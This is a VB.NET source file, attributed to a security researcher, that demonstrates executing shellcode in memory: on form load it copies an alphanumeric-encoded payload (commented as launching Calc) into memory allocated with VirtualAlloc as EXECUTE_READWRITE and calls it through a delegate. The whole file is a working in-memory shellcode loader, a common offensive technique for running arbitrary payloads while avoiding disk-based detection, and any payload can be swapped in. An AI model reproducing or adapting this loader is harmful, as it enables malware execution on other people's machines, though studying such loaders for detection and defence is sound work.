#If AFAC Then
    CC-By: Osanda Malith Jayathissa (@OsandaMalith)
    Executing Shellcode using VirtualAlloc in VB.NET
    Website: https://osandamalith.com
    https://creativecommons.org/licenses/by/3.0/
#End If

Imports System
Imports System.Runtime.InteropServices

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Calc Shellcode
        Dim shellcode As String = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylJHk9s0C0s0SPmYxeTqzrqtnkaBDpNkV2VlNkpRb4nkqbQ8dOx7rjfFtqyoVQo0nLgLqq1lfbVL10IQ8O6mWqiWZBl0BrSgNkaBDPNkbbwLUQJplKQPpxOukpbTRjWqXPV0nkg828Nkshq0c1N3zCUlQYnk5dlKS1N6eaKOfQYPNLjaxOdMS1kwUhKPQeydtCQmIh7KsM7TBUIrV8LKPX6DgqICpfNkVlrkLKrxWls1zsLK5TNkuQN0Oyg4GTvD3kQKSQqIcjPQkO9pChcobzLKVrJKMVsmBJfaLMMUx9GpEPC0v0E8vQlKBOMWYoyEMkM0wmtjDJCXoVoeoMomyojuEl4FalDJk09kkPQe35mkw7fsd2PoBJ30sciohUbCSQbLbCfNauD8SUs0AA"
        Dim shell_array(shellcode.Length - 1) As Byte
        Dim i As Integer = 0
        Do
            shell_array(i) = Convert.ToByte(shellcode(i))
            i = i + 1

        Loop While i < shellcode.Length

        Dim baseAddr As IntPtr = VirtualAlloc(IntPtr.Zero, New UIntPtr(CType(shell_array.Length, UInt32)), AllocationType.COMMIT Or AllocationType.RESERVE, MemoryProtection.EXECUTE_READWRITE)
        Try
            Marshal.Copy(shell_array, 0, baseAddr, CInt(shell_array.Length))
            DirectCast(Marshal.GetDelegateForFunctionPointer(baseAddr, GetType(ExecuteDelegate)), ExecuteDelegate)()
        Finally
            VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE)
        End Try
    End Sub

    <DllImport("kernel32.dll", CharSet:=CharSet.None, ExactSpelling:=False, SetLastError:=True)>
    Private Shared Function VirtualAlloc(
                ByVal lpAddress As IntPtr,
                ByVal dwSize As UIntPtr,
                ByVal flAllocationType As AllocationType,
                ByVal flProtect As MemoryProtection) As IntPtr
    End Function

    <DllImport("kernel32.dll", CharSet:=CharSet.None, ExactSpelling:=False)>
    Private Shared Function VirtualFree(
                ByVal lpAddress As IntPtr,
                ByVal dwSize As UInteger,
                ByVal dwFreeType As FreeType) As Boolean
    End Function

    <Flags>
    Public Enum AllocationType As UInteger
        COMMIT = 4096
        RESERVE = 8192
        RESET = 524288
        TOP_DOWN = 1048576
        WRITE_WATCH = 2097152
        PHYSICAL = 4194304
        LARGE_PAGES = 536870912
    End Enum

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function ExecuteDelegate() As Integer

    Public Enum FreeType As UInteger
        MEM_DECOMMIT = 16384
        MEM_RELEASE = 32768
    End Enum

    <Flags>
    Public Enum MemoryProtection As UInteger
        NOACCESS = 1
        [READONLY] = 2
        READWRITE = 4
        WRITECOPY = 8
        EXECUTE = 16
        EXECUTE_READ = 32
        EXECUTE_READWRITE = 64
        EXECUTE_WRITECOPY = 128
        GUARD_Modifierflag = 256
        NOCACHE_Modifierflag = 512
        WRITECOMBINE_Modifierflag = 1024
    End Enum
End Class
